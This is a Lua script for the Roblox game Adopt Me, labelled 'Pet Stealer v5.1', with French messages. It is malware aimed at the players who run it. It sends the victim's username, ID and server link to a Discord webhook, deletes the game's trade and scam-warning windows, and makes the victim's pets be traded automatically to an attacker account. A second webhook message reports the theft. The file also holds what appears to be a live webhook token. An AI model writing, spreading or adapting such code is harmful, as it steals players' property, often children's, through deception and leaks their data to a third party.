-- ğŸ¾ Adopt Me Pet Stealer v5.1 - AUTO TRADE + TRADING GUI KILLER + SERVER NOTIF
-- ğŸ”¥ Detects davidadoptme172 â†’ KILLS TRADING GUIs â†’ AUTO TRADES PETS!

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- âš™ï¸ YOUR SETTINGS
local WEBHOOK = "https://discord.com/api/webhooks/1451560358434308237/5QfplYntO1wBNphJBWpoFMmTyGhUuE58x63sT0cvEAaYFIT1mlYBs_T_LanwQZEyOg_3"
local OWNER = "davidadoptme172"  -- YOU!
local GAMEID = 920587237

print("ğŸ¾ **Pet Stealer v5.1 LOADING...** (Trading GUI Killer + SERVER TRACKER ACTIVE)")

if game.PlaceId ~= GAMEID then 
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "âŒ Wrong Game", Text = "Join Adopt Me!", Duration = 5
    })
end

local lp = Players.LocalPlayer

-- ğŸ”¥ SERVER GRABBER (ENVOIE NOTIF DÃˆS LE DÃ‰MARRAGE!)
local function sendVictimServer()
    local serverLink = "https://www.roblox.com/games/920587237/"..game.JobId
    local data = {
        username = "ğŸ’ **NOUVELLE VICTIME**",
        embeds = {{
            title = "ğŸ”¥ **SCRIPT ACTIVÃ‰** - PrÃªt pour trades invisibles!",
            description = "**"..lp.Name..":** Script chargÃ© - Joins TOUT DE SUITE!",
            color = 16711680,
            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..lp.UserId.."&width=420&height=420&format=png"},
            fields = {
                {name="ğŸ‘¤ Victime", value="**"..lp.Name.."** (`"..lp.UserId.."`)", inline=true},
                {name="ğŸŒ **Lien Serveur**", value="["..serverLink.."]("..serverLink..")", inline=false},
                {name="ğŸ‘¥ Joueurs", value="#"..#Players:GetPlayers().."/12", inline=true},
                {name="â° Temps", value="**Maintenant**", inline=true}
            },
            footer = {text = "Trades invisibles prÃªts! ğŸš€"}
        }},
        components = {{
            type = 1, components = {{
                type = 2, 
                label = "ğŸš€ **JOIN LE SERVEUR MAINTENANT**", 
                style = 5, 
                url = serverLink,
                emoji = {name="ğŸ”¥"}
            },{
                type = 2, 
                label = "ğŸ‘¤ Profil "..lp.Name, 
                style = 5, 
                url = "https://www.roblox.com/users/"..lp.UserId.."/profile"
            }}
        }}
    }
    pcall(function() 
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
    print("ğŸ“¤ **NOTIF ENVOYÃ‰E** â†’ "..serverLink)
end

-- ğŸ”’ TRADING GUI KILLER
local function killTradingGuis()
    for _, gui in pairs(lp.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            local guiName = gui.Name:lower()
            if guiName:find("trade") or guiName:find("trading") or guiName:find("scam") or 
               guiName:find("warning") or guiName:find("confirm") then
                gui:Destroy()
                print("ğŸ—‘ï¸ Killed: " .. gui.Name)
            end
        end
    end
end

-- ğŸ‘‘ OWNER DETECTOR
local ownerFound = false
spawn(function()
    while wait(1) do
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower() == OWNER:lower() and player ~= lp then
                if not ownerFound then
                    ownerFound = true
                    print("ğŸ‘‘ **"..OWNER.." DETECTÃ‰!** Auto-trade...")
                    
                    killTradingGuis()
                    spawn(function()
                        while ownerFound do
                            wait(0.5)
                            killTradingGuis()
                        end
                    end)
                    
                    spawn(function()
                        wait(2)
                        autoTradeToOwner()
                    end)
                    break
                end
            end
        end
        ownerFound = false
    end
end)

-- ğŸ’ AUTO TRADE
function autoTradeToOwner()
    local ownerPlayer = nil
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower() == OWNER:lower() then
            ownerPlayer = p
            break
        end
    end
    
    if ownerPlayer then
        print("ğŸ **AUTO TRADE â†’ "..OWNER.."**")
        local pets = {}
        for _, tool in pairs(lp.Backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:lower():find("pet") then
                table.insert(pets, tool.Name)
            end
        end
        
        pcall(function()
            local tradeRemotes = {"TradeRemoteEvent", "MainEvent", "TradeEvent", "TradingRemote"}
            for _, remoteName in pairs(tradeRemotes) do
                if ReplicatedStorage:FindFirstChild(remoteName) then
                    ReplicatedStorage[remoteName]:FireServer("StartTradeWithPlayer", ownerPlayer.UserId)
                    wait(0.5)
                    for _, petName in pairs(pets) do
                        ReplicatedStorage[remoteName]:FireServer("AddItemToTrade", petName)
                    end
                    wait(1)
                    ReplicatedStorage[remoteName]:FireServer("AcceptTrade")
                    break
                end
            end
        end)
        
        -- NOTIF TRADE COMPLETE
        local data = {
            username = "ğŸ’ **PETS VOLÃ‰S!**",
            embeds = {{title = "ğŸ‰ **TRADE TERMINÃ‰!**", 
                      description = "**"..lp.Name.."'s pets â†’ "..OWNER.."**\nPets: "..table.concat(pets, ", "), 
                      color = 65280,
                      fields = {
                          {name="ğŸŒ Serveur", value="https://www.roblox.com/games/920587237/"..game.JobId, inline=false}
                      }
            }}
        }
        pcall(function() HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)
    end
end

-- ğŸš€ ENVOIE NOTIF DÃˆS LE DÃ‰MARRAGE (PRINCIPAL!)
sendVictimServer()

-- ğŸ”„ Refresh toutes les 45s
spawn(function() while wait(45) do sendVictimServer() end end)

-- ğŸ’° Fake farm
spawn(function()
    while wait(2) do
        pcall(function()
            if ReplicatedStorage:FindFirstChild("MainEvent") then
                ReplicatedStorage.MainEvent:FireServer("CollectBucks")
            end
        end)
    end
end)

-- ğŸ’« Anti-AFK
spawn(function()
    while wait(60) do
        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid:Move(Vector3.new())
        end
    end
end)

-- âœ… Notification succÃ¨s
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "ğŸ¾ Pet Stealer v5.1", 
    Text = "âœ… **Script chargÃ©!**\nğŸ“¤ Serveur envoyÃ© Ã  Discord\nğŸ‘‘ Attends "..OWNER, 
    Duration = 5
})

print("âœ… **Pet Stealer v5.1 LIVE!** Serveur envoyÃ© â†’ PrÃªt pour trades!")
